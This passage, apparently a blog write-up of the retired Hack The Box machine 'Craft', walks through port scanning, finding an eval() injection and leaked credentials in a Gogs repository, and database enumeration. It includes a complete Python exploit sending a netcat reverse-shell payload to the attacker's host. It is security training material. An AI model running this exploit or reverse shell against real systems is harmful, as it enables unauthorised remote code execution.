@@ -1,0 +1,644 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.5.0 -->
+<title>Hack The Box - Craft | 0xRick</title>
+<meta name="generator" content="Jekyll v3.8.5" />
+<meta property="og:title" content="Hack The Box - Craft" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="My write-up / walkthrough for Craft from Hack The Box." />
+<meta property="og:description" content="My write-up / walkthrough for Craft from Hack The Box." />
+<link rel="canonical" href="https://0xrick.github.io/hack-the-box/craft/" />
+<meta property="og:url" content="https://0xrick.github.io/hack-the-box/craft/" />
+<meta property="og:site_name" content="0xRick" />
+<meta property="og:image" content="https://0xrick.github.io/hackthebox/craft/0.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-01-04T00:00:00+02:00" />
+<script type="application/ld+json">
+{"description":"My write-up / walkthrough for Craft from Hack The Box.","@type":"BlogPosting","url":"https://0xrick.github.io/hack-the-box/craft/","image":"https://0xrick.github.io/hackthebox/craft/0.png","headline":"Hack The Box - Craft","dateModified":"2020-01-04T00:00:00+02:00","datePublished":"2020-01-04T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://0xrick.github.io/hack-the-box/craft/"},"@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/ad.css">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="https://0xrick.github.io/feed.xml" title="0xRick" /><script defer src="https://use.fontawesome.com/releases/v5.8.1/js/all.js" integrity="sha384-g5uSoOSBd7KkhAMlnQILrecXvzst9TdC09/VM+pjDTCM+1il8RHz5fKANTFFb+gQ" crossorigin="anonymous"></script>
+</head><!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-97164925-2');
+</script>
+
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">0xRick<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        <a class="color-cyan-hover" href="https://twitter.com/Ahm3d_H3sham/" target="_blank" rel="noopener noreferrer"><i class="fab fa-twitter"></i></a><a class="color-blue-hover" href="https://facebook.com/Ahm3d.H3sham/" target="_blank" rel="noopener noreferrer"><i class="fab fa-facebook"></i></a><a class="color-purple-hover" href="https://github.com/0xRick" target="_blank" rel="noopener noreferrer"><i class="fab fa-github"></i></a><a class="color-orange-hover" href="https://www.reddit.com/user/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer"><i class="fab fa-reddit"></i></a><a class="color-cyan-hover" href="https://discordapp.com/users/332196573771595777" target="_blank" rel="noopener noreferrer"><i class="fab fa-discord"></i></a>
+        <a class="color-red-hover" href="mailto:x0rick@protonmail.com"><i class="fa fa-envelope"></i></a>
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <div class="author-box">
+<img src="/avatar.jpg" width="256px" height="256px" class="author-avatar" onclick="window.open('https://www.hackthebox.eu/profile/65598','_blank');">
+<h7>
+	Ahmed Hesham<br>
+	CyberSec/InfoSec enthusiast. <br>
+	Interested in knowing how things work/Interested in breaking them, always learning.
+</h7>
+</div>
+
+  <br>
+<div>
+	<h7>    Ad </h7>
+	<script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&amp;placement=0xrickgithubio" id="_carbonads_js"></script>
+</div>
+<div class="post">
+  <h1 class="post-title">Hack The Box - Craft</h1>
+  
+  <div class="post-tags">
+      
+      <a class="tag" href="/tag/linux/">linux</a>
+      
+      <a class="tag" href="/tag/web/">web</a>
+      
+      <a class="tag" href="/tag/ssh/">ssh</a>
+      
+      <a class="tag" href="/tag/rce/">rce</a>
+      
+      <a class="tag" href="/tag/python/">python</a>
+      
+      <a class="tag" href="/tag/code-analysis/">code-analysis</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 04 Jan 2020</div>
+  
+  <div class="post-description">My write-up / walkthrough for Craft from Hack The Box.</div>
+  
+  <hr>
+
+<h2 id="quick-summary">Quick Summary</h2>
+<p><br>Hey guys, today Craft retired and here’s my write-up about it. It’s a medium rated Linux box and its ip is <code class="highlighter-rouge">10.10.10.110</code>, I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">craft.htb</code>. Let’s jump right in !
+<br>
+<img src="/images/hackthebox/craft/0.png" alt="">
+<br></p>
+<hr>
+
+<h2 id="nmap">Nmap</h2>
+<p><br>As always we will start with <code class="highlighter-rouge">nmap</code> to scan for open ports and services:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/craft# nmap -sV -sT -sC -o nmapinitial craft.htb
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-03 13:41 EST
+Nmap scan report for craft.htb (10.10.10.110)
+Host is up (0.22s latency).
+Not shown: 998 closed ports
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
+|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
+|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
+443/tcp open  ssl/http nginx 1.15.8
+|_http-server-header: nginx/1.15.8
+|_http-title: About
+| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
+| Not valid before: 2019-02-06T02:25:47
+|_Not valid after:  2020-06-20T02:25:47
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+| tls-nextprotoneg: 
+|_  http/1.1
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 75.97 seconds
+root@kali:~/Desktop/HTB/boxes/craft# 
+</code></pre></div></div>
+<p><br>We got <code class="highlighter-rouge">https</code> on port 443 and <code class="highlighter-rouge">ssh</code> on port 22.
+<br></p>
+<hr>
+
+<h2 id="web-enumeration">Web Enumeration</h2>
+<p><br>The home page was kinda empty, Only the about info and nothing else:<br>
+<img src="/images/hackthebox/craft/1.png" alt="">
+<br><br>The navigation bar had two external links, one of them was to <code class="highlighter-rouge">https://api.craft.htb/api/</code> and the other one was to <code class="highlighter-rouge">https://gogs.craft.htb</code>:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;ul</span> <span class="na">class=</span><span class="s">"nav navbar-nav pull-right"</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"https://api.craft.htb/api/"</span><span class="nt">&gt;</span>API<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
+            <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"https://gogs.craft.htb/"</span><span class="nt">&gt;&lt;img</span> <span class="na">border=</span><span class="s">"0"</span> <span class="na">alt=</span><span class="s">"Git"</span> <span class="na">src=</span><span class="s">"/static/img/Git-Icon-Black.png"</span> <span class="na">width=</span><span class="s">"20"</span> <span class="na">height=</span><span class="s">"20"</span><span class="nt">&gt;&lt;/a&gt;&lt;/li&gt;</span>
+          <span class="nt">&lt;/ul&gt;</span>
+</code></pre></div></div>
+<p><br>So I added both of <code class="highlighter-rouge">api.craft.htb</code> and <code class="highlighter-rouge">gogs.craft.htb</code> to <code class="highlighter-rouge">/etc/hosts</code> then I started checking them.
+<br><code class="highlighter-rouge">https://api.craft.htb/api</code>:<br>
+<img src="/images/hackthebox/craft/2.png" alt="">
+<br><br>
+Here we can see the <code class="highlighter-rouge">API</code> endpoints and how to interact with them. 
+<br>We’re interested in the authentication part for now, there are two endpoints, <code class="highlighter-rouge">/auth/check</code> which checks the validity of an authorization token and <code class="highlighter-rouge">/auth/login</code> which creates an authorization token provided valid credentials. 
+<br>
+<img src="/images/hackthebox/craft/3.png" alt="">
+<br><br>
+<img src="/images/hackthebox/craft/4.png" alt="">
+<br><br>
+<img src="/images/hackthebox/craft/5.png" alt="">
+<br><br>We don’t have credentials to authenticate so let’s keep enumerating. 
+<br>Obviously <code class="highlighter-rouge">gogs.craft.htb</code> had <code class="highlighter-rouge">gogs</code> running:<br>
+<img src="/images/hackthebox/craft/6.png" alt="">
+<br><br>
+The repository of the <code class="highlighter-rouge">API</code> source code was publicly accessible so I took a look at the code and the commits. 
+<br>
+<img src="/images/hackthebox/craft/7.png" alt="">
+<br><br>
+<img src="/images/hackthebox/craft/8.png" alt="">
+<br><br>
+<img src="/images/hackthebox/craft/9.png" alt="">
+<br><br>Dinesh’s commits <code class="highlighter-rouge">c414b16057</code> and <code class="highlighter-rouge">10e3ba4f0a</code> had some interesting stuff. First one had some code additions to <code class="highlighter-rouge">/brew/endpoints/brew.py</code> where user’s input is being passed to <code class="highlighter-rouge">eval()</code> without filtering:<br>
+<img src="/images/hackthebox/craft/10.png" alt="">
+<br><br></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">@@</span> <span class="o">-</span><span class="mi">38</span><span class="p">,</span><span class="mi">9</span> <span class="o">+</span><span class="mi">38</span><span class="p">,</span><span class="mi">13</span> <span class="err">@@</span> <span class="k">class</span> <span class="nc">BrewCollection</span><span class="p">(</span><span class="n">Resource</span><span class="p">):</span>
+         <span class="s">"""
+         Creates a new brew entry.
+         """</span>
+<span class="o">-</span>
+<span class="o">-</span>        <span class="n">create_brew</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="p">)</span>
+<span class="o">-</span>        <span class="k">return</span> <span class="bp">None</span><span class="p">,</span> <span class="mi">201</span>
+<span class="o">+</span>
+<span class="o">+</span>        <span class="c"># make sure the ABV value is sane.</span>
+<span class="o">+</span>        <span class="k">if</span> <span class="nb">eval</span><span class="p">(</span><span class="s">'</span><span class="si">%</span><span class="s">s &gt; 1'</span> <span class="o">%</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="p">[</span><span class="s">'abv'</span><span class="p">]):</span>
+<span class="o">+</span>            <span class="k">return</span> <span class="s">"ABV must be a decimal value less than 1.0"</span><span class="p">,</span> <span class="mi">400</span>
+<span class="o">+</span>        <span class="k">else</span><span class="p">:</span>
+<span class="o">+</span>            <span class="n">create_brew</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="p">)</span>
+<span class="o">+</span>            <span class="k">return</span> <span class="bp">None</span><span class="p">,</span> <span class="mi">201</span>
+ <span class="nd">@ns.route</span><span class="p">(</span><span class="s">'/&lt;int:id&gt;'</span><span class="p">)</span>
+ <span class="nd">@api.response</span><span class="p">(</span><span class="mi">404</span><span class="p">,</span> <span class="s">'Brew not found.'</span><span class="p">)</span>
+</code></pre></div></div>
+<p><br>I took a look at the <code class="highlighter-rouge">API</code> documentation again to find in which request I can send the <code class="highlighter-rouge">abv</code> parameter:<br>
+<img src="/images/hackthebox/craft/11.png" alt="">
+<br><br>
+As you can see we can send a <code class="highlighter-rouge">POST</code> request to <code class="highlighter-rouge">/brew</code> and inject our payload in the parameter <code class="highlighter-rouge">abv</code>, However we still need an authorization token to be able to interact with <code class="highlighter-rouge">/brew</code>, and we don’t have any credentials.
+<br>The other commit was a test script which had hardcoded credentials, exactly what we need:<br>
+<img src="/images/hackthebox/craft/12.png" alt="">
+<br><br></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">+</span><span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'https://api.craft.htb/api/auth/login'</span><span class="p">,</span>  <span class="n">auth</span><span class="o">=</span><span class="p">(</span><span class="s">'dinesh'</span><span class="p">,</span> <span class="s">'4aUh0A8PbVJxgd'</span><span class="p">),</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+<span class="o">+</span><span class="n">json_response</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+<span class="o">+</span><span class="n">token</span> <span class="o">=</span>  <span class="n">json_response</span><span class="p">[</span><span class="s">'token'</span><span class="p">]</span>
+<span class="o">+</span>
+<span class="o">+</span><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span> <span class="s">'X-Craft-API-Token'</span><span class="p">:</span> <span class="n">token</span><span class="p">,</span> <span class="s">'Content-Type'</span><span class="p">:</span> <span class="s">'application/json'</span>  <span class="p">}</span>
+<span class="o">+</span>
+<span class="o">+</span><span class="c"># make sure token is valid</span>
+<span class="o">+</span><span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'https://api.craft.htb/api/auth/check'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+<span class="o">+</span><span class="k">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+<span class="o">+</span>
+</code></pre></div></div>
+<p><br>I tested the credentials and they were valid:<br>
+<img src="/images/hackthebox/craft/13.png" alt="">
+<br><br>
+<img src="/images/hackthebox/craft/14.png" alt="">
+<br></p>
+<hr>
+
+<h2 id="rce--shell-on-docker-container">RCE –&gt; Shell on Docker Container</h2>
+<p><br>I wrote a small script to authenticate, grab the token, exploit the vulnerability and spawn a shell.
+<br><code class="highlighter-rouge">exploit.py</code>:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python3 </span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">json</span>
+<span class="kn">from</span> <span class="nn">subprocess</span> <span class="kn">import</span> <span class="n">Popen</span>
+<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>
+<span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">system</span>
+
+<span class="n">requests</span><span class="o">.</span><span class="n">packages</span><span class="o">.</span><span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">(</span><span class="n">requests</span><span class="o">.</span><span class="n">packages</span><span class="o">.</span><span class="n">urllib3</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>
+
+<span class="n">GREEN</span> <span class="o">=</span> <span class="s">"</span><span class="se">\033</span><span class="s">[32m"</span>
+<span class="n">YELLOW</span> <span class="o">=</span> <span class="s">"</span><span class="se">\033</span><span class="s">[93m"</span> 
+
+<span class="k">def</span> <span class="nf">get_token</span><span class="p">():</span>
+	<span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'https://api.craft.htb/api/auth/login'</span><span class="p">,</span>  <span class="n">auth</span><span class="o">=</span><span class="p">(</span><span class="s">'dinesh'</span><span class="p">,</span> <span class="s">'4aUh0A8PbVJxgd'</span><span class="p">),</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+	<span class="n">response</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
+	<span class="n">token</span> <span class="o">=</span> <span class="n">response</span><span class="p">[</span><span class="s">'token'</span><span class="p">]</span>
+	<span class="k">return</span> <span class="n">token</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
+	<span class="n">tmp</span> <span class="o">=</span> <span class="p">{}</span>
+
+	<span class="n">tmp</span><span class="p">[</span><span class="s">'id'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span>
+	<span class="n">tmp</span><span class="p">[</span><span class="s">'name'</span><span class="p">]</span> <span class="o">=</span> <span class="s">"pwned"</span>
+	<span class="n">tmp</span><span class="p">[</span><span class="s">'brewer'</span><span class="p">]</span> <span class="o">=</span> <span class="s">"pwned"</span>
+	<span class="n">tmp</span><span class="p">[</span><span class="s">'style'</span><span class="p">]</span> <span class="o">=</span> <span class="s">"pwned"</span>
+	<span class="n">tmp</span><span class="p">[</span><span class="s">'abv'</span><span class="p">]</span> <span class="o">=</span> <span class="s">"__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc {} {} &gt;/tmp/f')"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
+
+	<span class="n">payload</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span>
+
+	<span class="k">print</span><span class="p">(</span><span class="n">YELLOW</span> <span class="o">+</span> <span class="s">"[+] Starting listener on port {}"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">port</span><span class="p">))</span>
+	<span class="n">Popen</span><span class="p">([</span><span class="s">"nc"</span><span class="p">,</span><span class="s">"-lvnp"</span><span class="p">,</span><span class="n">port</span><span class="p">])</span>
+
+	<span class="k">print</span><span class="p">(</span><span class="n">YELLOW</span> <span class="o">+</span> <span class="s">"[+] Sending payload"</span><span class="p">)</span>
+	<span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">'https://api.craft.htb/api/brew/'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s">'X-Craft-API-Token'</span><span class="p">:</span> <span class="n">token</span><span class="p">,</span> <span class="s">'Content-Type'</span><span class="p">:</span> <span class="s">'application/json'</span><span class="p">},</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
+	<span class="k">print</span><span class="p">(</span><span class="n">YELLOW</span> <span class="o">+</span> <span class="s">"[!] Usage: {} [IP] [PORT]"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
+	<span class="nb">exit</span><span class="p">()</span>
+
+<span class="n">ip</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">port</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+<span class="k">print</span><span class="p">(</span><span class="n">YELLOW</span> <span class="o">+</span> <span class="s">"[+] Authenticating"</span><span class="p">)</span>
+<span class="n">token</span> <span class="o">=</span> <span class="n">get_token</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="n">GREEN</span> <span class="o">+</span> <span class="s">"[*] Token: {}"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">token</span><span class="p">))</span>
+<span class="n">exploit</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+</code></pre></div></div>
+<p><br>
+<img src="/images/hackthebox/craft/15.png" alt="">
+<br><br>Turns out that the application was hosted on a docker container and I didn’t get a shell on the actual host.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/app # cd /
+/ # ls -la
+total 64
+drwxr-xr-x    1 root     root          4096 Feb 10  2019 .
+drwxr-xr-x    1 root     root          4096 Feb 10  2019 ..
+-rwxr-xr-x    1 root     root             0 Feb 10  2019 .dockerenv
+drwxr-xr-x    1 root     root          4096 Jan  3 17:20 bin
+drwxr-xr-x    5 root     root           340 Jan  3 14:58 dev
+drwxr-xr-x    1 root     root          4096 Feb 10  2019 etc
+drwxr-xr-x    2 root     root          4096 Jan 30  2019 home
+drwxr-xr-x    1 root     root          4096 Feb  6  2019 lib
+drwxr-xr-x    5 root     root          4096 Jan 30  2019 media
+drwxr-xr-x    2 root     root          4096 Jan 30  2019 mnt
+drwxr-xr-x    1 root     root          4096 Feb  9  2019 opt
+dr-xr-xr-x  238 root     root             0 Jan  3 14:58 proc
+drwx------    1 root     root          4096 Jan  3 15:16 root
+drwxr-xr-x    2 root     root          4096 Jan 30  2019 run
+drwxr-xr-x    2 root     root          4096 Jan 30  2019 sbin
+drwxr-xr-x    2 root     root          4096 Jan 30  2019 srv
+dr-xr-xr-x   13 root     root             0 Jan  3 14:58 sys
+drwxrwxrwt    1 root     root          4096 Jan  3 17:26 tmp
+drwxr-xr-x    1 root     root          4096 Feb  9  2019 usr
+drwxr-xr-x    1 root     root          4096 Jan 30  2019 var
+/ #
+</code></pre></div></div>
+<p><br></p>
+<hr>
+
+<h2 id="gilfoyles-gogs-credentials--ssh-key--ssh-as-gilfoyle--user-flag">Gilfoyle’s Gogs Credentials –&gt; SSH Key –&gt; SSH as Gilfoyle –&gt; User Flag</h2>
+<p><br>In <code class="highlighter-rouge">/opt/app</code> there was a python script called <code class="highlighter-rouge">dbtest.py</code>, It connects to the database and executes a <code class="highlighter-rouge">SQL</code> query:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">app</span> <span class="c"># ls -la</span>
+<span class="n">total</span> <span class="mi">44</span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>    <span class="mi">5</span> <span class="n">root</span>     <span class="n">root</span>          <span class="mi">4096</span> <span class="n">Jan</span>  <span class="mi">3</span> <span class="mi">17</span><span class="p">:</span><span class="mi">28</span> <span class="o">.</span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>    <span class="mi">1</span> <span class="n">root</span>     <span class="n">root</span>          <span class="mi">4096</span> <span class="n">Feb</span>  <span class="mi">9</span>  <span class="mi">2019</span> <span class="o">..</span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>    <span class="mi">8</span> <span class="n">root</span>     <span class="n">root</span>          <span class="mi">4096</span> <span class="n">Feb</span>  <span class="mi">8</span>  <span class="mi">2019</span> <span class="o">.</span><span class="n">git</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>    <span class="mi">1</span> <span class="n">root</span>     <span class="n">root</span>            <span class="mi">18</span> <span class="n">Feb</span>  <span class="mi">7</span>  <span class="mi">2019</span> <span class="o">.</span><span class="n">gitignore</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>    <span class="mi">1</span> <span class="n">root</span>     <span class="n">root</span>          <span class="mi">1585</span> <span class="n">Feb</span>  <span class="mi">7</span>  <span class="mi">2019</span> <span class="n">app</span><span class="o">.</span><span class="n">py</span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>    <span class="mi">5</span> <span class="n">root</span>     <span class="n">root</span>          <span class="mi">4096</span> <span class="n">Feb</span>  <span class="mi">7</span>  <span class="mi">2019</span> <span class="n">craft_api</span>
+<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>    <span class="mi">1</span> <span class="n">root</span>     <span class="n">root</span>           <span class="mi">673</span> <span class="n">Feb</span>  <span class="mi">8</span>  <span class="mi">2019</span> <span class="n">dbtest</span><span class="o">.</span><span class="n">py</span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>    <span class="mi">2</span> <span class="n">root</span>     <span class="n">root</span>          <span class="mi">4096</span> <span class="n">Feb</span>  <span class="mi">7</span>  <span class="mi">2019</span> <span class="n">tests</span>
+<span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">app</span> <span class="c"># cat dbtest.py</span>
+<span class="c">#!/usr/bin/env python</span>
+
+<span class="kn">import</span> <span class="nn">pymysql</span>
+<span class="kn">from</span> <span class="nn">craft_api</span> <span class="kn">import</span> <span class="n">settings</span>
+
+<span class="c"># test connection to mysql database</span>
+
+<span class="n">connection</span> <span class="o">=</span> <span class="n">pymysql</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="n">settings</span><span class="o">.</span><span class="n">MYSQL_DATABASE_HOST</span><span class="p">,</span>
+                             <span class="n">user</span><span class="o">=</span><span class="n">settings</span><span class="o">.</span><span class="n">MYSQL_DATABASE_USER</span><span class="p">,</span>
+                             <span class="n">password</span><span class="o">=</span><span class="n">settings</span><span class="o">.</span><span class="n">MYSQL_DATABASE_PASSWORD</span><span class="p">,</span>
+                             <span class="n">db</span><span class="o">=</span><span class="n">settings</span><span class="o">.</span><span class="n">MYSQL_DATABASE_DB</span><span class="p">,</span>
+                             <span class="n">cursorclass</span><span class="o">=</span><span class="n">pymysql</span><span class="o">.</span><span class="n">cursors</span><span class="o">.</span><span class="n">DictCursor</span><span class="p">)</span>
+
+<span class="k">try</span><span class="p">:</span> 
+    <span class="k">with</span> <span class="n">connection</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span> <span class="k">as</span> <span class="n">cursor</span><span class="p">:</span>
+        <span class="n">sql</span> <span class="o">=</span> <span class="s">"SELECT `id`, `brewer`, `name`, `abv` FROM `brew` LIMIT 1"</span>
+        <span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql</span><span class="p">)</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">cursor</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+
+<span class="k">finally</span><span class="p">:</span>
+    <span class="n">connection</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">app</span> <span class="c">#</span>
+</code></pre></div></div>
+<p><br>I copied the script and changed <code class="highlighter-rouge">result = cursor.fetchone()</code> to <code class="highlighter-rouge">result = cursor.fetchall()</code> and I changed the query to <code class="highlighter-rouge">SHOW TABLES</code>:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
+
+<span class="kn">import</span> <span class="nn">pymysql</span>
+<span class="kn">from</span> <span class="nn">craft_api</span> <span class="kn">import</span> <span class="n">settings</span>
+
+<span class="c"># test connection to mysql database</span>
+
+<span class="n">connection</span> <span class="o">=</span> <span class="n">pymysql</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="n">settings</span><span class="o">.</span><span class="n">MYSQL_DATABASE_HOST</span><span class="p">,</span>
+                             <span class="n">user</span><span class="o">=</span><span class="n">settings</span><span class="o">.</span><span class="n">MYSQL_DATABASE_USER</span><span class="p">,</span>
+                             <span class="n">password</span><span class="o">=</span><span class="n">settings</span><span class="o">.</span><span class="n">MYSQL_DATABASE_PASSWORD</span><span class="p">,</span>
+                             <span class="n">db</span><span class="o">=</span><span class="n">settings</span><span class="o">.</span><span class="n">MYSQL_DATABASE_DB</span><span class="p">,</span>
+                             <span class="n">cursorclass</span><span class="o">=</span><span class="n">pymysql</span><span class="o">.</span><span class="n">cursors</span><span class="o">.</span><span class="n">DictCursor</span><span class="p">)</span>
+
+<span class="k">try</span><span class="p">:</span> 
+    <span class="k">with</span> <span class="n">connection</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span> <span class="k">as</span> <span class="n">cursor</span><span class="p">:</span>
+        <span class="n">sql</span> <span class="o">=</span> <span class="s">"SHOW TABLES"</span>
+        <span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql</span><span class="p">)</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">cursor</span><span class="o">.</span><span class="n">fetchall</span><span class="p">()</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+
+<span class="k">finally</span><span class="p">:</span>
+    <span class="n">connection</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div></div>
+<p><br>There were two tables, <code class="highlighter-rouge">user</code> and <code class="highlighter-rouge">brew</code>:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/app # wget http://10.10.xx.xx/db1.py
+Connecting to 10.10.xx.xx (10.10.xx.xx:80)
+db1.py               100% |********************************|   629  0:00:00 ETA
+
+/opt/app # python db1.py
+[{'Tables_in_craft': 'brew'}, {'Tables_in_craft': 'user'}]
+/opt/app # rm db1.py
+/opt/app #
+</code></pre></div></div>
+<p><br>I changed the query to <code class="highlighter-rouge">SELECT * FROM user</code>:</p>
